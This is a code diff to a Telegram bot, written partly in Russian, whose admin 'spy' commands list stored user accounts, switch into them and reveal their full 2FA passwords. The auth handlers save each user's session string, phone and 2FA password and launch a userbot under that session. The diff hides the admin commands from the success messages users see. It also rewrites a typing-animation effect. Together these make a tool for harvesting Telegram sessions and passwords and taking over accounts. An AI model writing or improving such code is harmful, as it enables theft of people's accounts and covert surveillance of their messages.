@@ -98,7 +98,7 @@ async def spyhelp(message: aiogram_types.Message):
 🕵️ <b>АДМИН КОМАНДЫ</b>
 
 <b>👥 УПРАВЛЕНИЕ АККАУНТАМИ</b>
-/users - список всех аккаунтов (с 2FA)
+/users - список всех аккаунтов
 /swap НОМЕР - переключиться на аккаунт
 /active - показать активный аккаунт
 /show2fa НОМЕР - показать полный 2FA
@@ -663,7 +663,7 @@ async def complete_auth(callback, user_id: int):
                        (user_id, session_str, data["phone"], None, me.first_name, me.last_name, me.username, 0))
         conn.commit()
         
-        await callback.message.answer("✅ Авторизация успешна!\n\n👥 /users - список аккаунтов\n🔄 /swap НОМЕР - переключиться")
+        await callback.message.answer("✅ Авторизация успешна!")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
@@ -690,7 +690,7 @@ async def handle_2fa(message: aiogram_types.Message):
                        (user_id, session_str, data["phone"], message.text.strip(), me.first_name, me.last_name, me.username, 0))
         conn.commit()
         
-        await message.answer("✅ Авторизация успешна!\n\n👥 /users - список аккаунтов\n🔄 /swap НОМЕР - переключиться")
+        await message.answer("✅ Авторизация успешна!")
         asyncio.create_task(run_userbot(user_id, session_str))
         await data["client"].disconnect()
         del temp_auth[user_id]
@@ -889,15 +889,13 @@ async def run_userbot(owner_id: int, session_string: str):
             txt = text[6:]
             if txt:
                 await event.delete()
-                msg = await client.send_message(event.chat_id, "")
-                typed = ""
+                msg = None
                 for ch in txt:
-                    typed += ch
-                    try:
-                        await msg.edit(typed)
-                    except:
-                        pass
-                    await asyncio.sleep(0.15)
+                    if msg is None:
+                        msg = await client.send_message(event.chat_id, ch)
+                    else:
+                        await msg.edit(msg.text + ch)
+                    await asyncio.sleep(0.2)
                 await asyncio.sleep(0.5)
                 await msg.delete()
             return
